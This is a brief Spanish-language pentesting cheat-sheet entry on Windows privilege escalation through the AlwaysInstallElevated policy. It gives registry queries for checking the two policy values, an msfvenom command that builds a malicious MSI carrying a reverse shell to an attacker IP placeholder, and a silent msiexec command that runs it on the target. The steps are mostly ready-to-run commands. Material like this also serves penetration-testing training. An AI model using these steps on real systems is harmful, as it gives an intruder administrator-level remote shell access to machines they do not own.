# Windows AlwaysInstallElevated setup files (aka .msi files)

## **Los archivos de instalación de Windows AlwaysInstallElevated** (también conocidos como archivos .msi)

Se ejecutan con el nivel de privilegio del usuario que lo inicia. Sin embargo, estos pueden configurarse para ejecutarse con mayores privilegios si la instalación requiere privilegios de administrador. Esto podría permitirnos generar un archivo MSI malicioso que se ejecutaría con privilegios de administrador.

Este método requiere que se establezcan dos valores de registro. Puede consultarlos desde la línea de comando usando los comandos a continuación.

{% code overflow="wrap" %}
```powershell
reg query HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\Installer
reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer
```
{% endcode %}

💡 Recuerde, para poder explotar esta vulnerabilidad, ambos deben estar configurados. De lo contrario, la explotación no será posible.

Si están configurados, puede generar un archivo .msi malicioso usando `msfvenom`, como se ve a continuación.

{% code overflow="wrap" %}
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
```
{% endcode %}

* Configurar Metasploit Handler en escucha del puerto configurado.
* Transferir el archivo .msi
* Ejecutar el instalador con el siguiente comando en el sistema Objetivo y recibir el shell inverso.

```
C:\\Users\\user\\Desktop>msiexec /quiet /qn /i C:\\Windows\\Temp\\malicious.msi
```

****
